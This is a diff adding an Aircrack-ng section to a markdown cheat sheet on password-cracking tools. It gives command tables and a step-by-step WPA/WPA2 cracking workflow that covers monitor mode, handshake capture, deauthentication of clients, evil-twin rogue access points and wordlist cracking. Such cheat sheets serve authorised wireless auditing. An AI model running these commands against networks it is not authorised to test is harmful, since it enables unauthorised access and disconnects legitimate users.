@@ -100,6 +100,59 @@ While Ophcrack is most famous for its graphical interface, it also has a command
 | **Disable GUI (Console Mode)** | Forces Ophcrack to run entirely in the terminal interface without launching the graphical window. | `ophcrack -s -f hashes.txt`             |
 | **Display Help**               | Prints the full list of available command-line arguments and usage instructions. | `ophcrack -h`                           |
 
+## Aircrack-ng Suite
+
+### Core Cracking Commands (aircrack-ng)
+
+Aircrack-ng is the primary cracking tool within the suite, used to recover WEP and WPA/WPA2-PSK keys once enough data packets or a 4-way handshake has been captured.
+
+| Command | Description | Example |
+| :--- | :--- | :--- |
+| **Dictionary Attack (WPA/WPA2)** | Cracks WPA/WPA2 passwords using a captured handshake and a wordlist. | `aircrack-ng -w rockyou.txt capture.cap` |
+| **Target Specific BSSID** | Targets a specific MAC address (BSSID) if the capture file contains multiple networks. | `aircrack-ng -b 00:11:22:33:44:55 capture.cap` |
+| **Target Specific ESSID** | Targets a specific network name (ESSID) in the capture file. | `aircrack-ng -e "MyNetwork" capture.cap` |
+| **Standard WEP Cracking** | Cracks WEP keys using the PTW approach (requires sufficient IVs captured). | `aircrack-ng -a 1 capture.cap` |
+| **Save/Restore Session** | Saves the current cracking progress to a file, or restores it later. | `aircrack-ng -w rockyou.txt -N session.db capture.cap` |
+
+---
+
+### Aircrack-ng Suite Tools
+
+Unlike Hashcat or John the Ripper, Aircrack-ng is a full suite of tools designed to handle every step of the wireless auditing process, from putting the interface into monitor mode to capturing the required handshakes.
+
+| Tool | Purpose | Command / Example |
+| :--- | :--- | :--- |
+| **airmon-ng** | Manages wireless interfaces. Used to enable or disable monitor mode, allowing the card to capture all wireless traffic. | `airmon-ng start wlan0` |
+| **airodump-ng** | The packet sniffer. Used to scan for target networks and capture their packets (specifically the WPA 4-way handshake) to a `.cap` file. | `airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon` |
+| **aireplay-ng** | Injects frames. Most commonly used to send deauthentication (deauth) packets to force a client to disconnect and reconnect, generating a handshake. | `aireplay-ng -0 5 -a [Router MAC] -c [Client MAC] wlan0mon` |
+| **airbase-ng** | Used for attacking clients rather than the Access Point. Can create rogue Access Points (Evil Twin attacks). | `airbase-ng -e "Free WiFi" -c 6 wlan0mon` |
+
+---
+
+## Examples
+
+#### Full WPA/WPA2 Cracking Workflow
+
+To crack a WPA/WPA2 network, you typically use three tools from the suite in sequence:
+
+1. **Start Monitor Mode:**
+   ```bash
+   airmon-ng start wlan0
+   ```
+2. **Capture the Handshake (Leave this running):**
+   ```bash
+   airodump-ng -c [Channel] --bssid [Target MAC] -w mycapture wlan0mon
+   ```
+3. **Force a Handshake (In a new terminal window):**
+   ```bash
+   aireplay-ng -0 2 -a [Target MAC] -c [Client MAC] wlan0mon
+   ```
+   *Note: `-0 2` sends 2 deauthentication packets to temporarily kick the client off the network.*
+4. **Crack the Captured Hash:**
+   ```bash
+   aircrack-ng -w /usr/share/wordlists/rockyou.txt mycapture-01.cap
+   ```
+   *Once `airodump-ng` displays "WPA handshake: [MAC]", you can stop the capture and run `aircrack-ng` to compare the handshake against your wordlist.*
 
 
 ## Examples
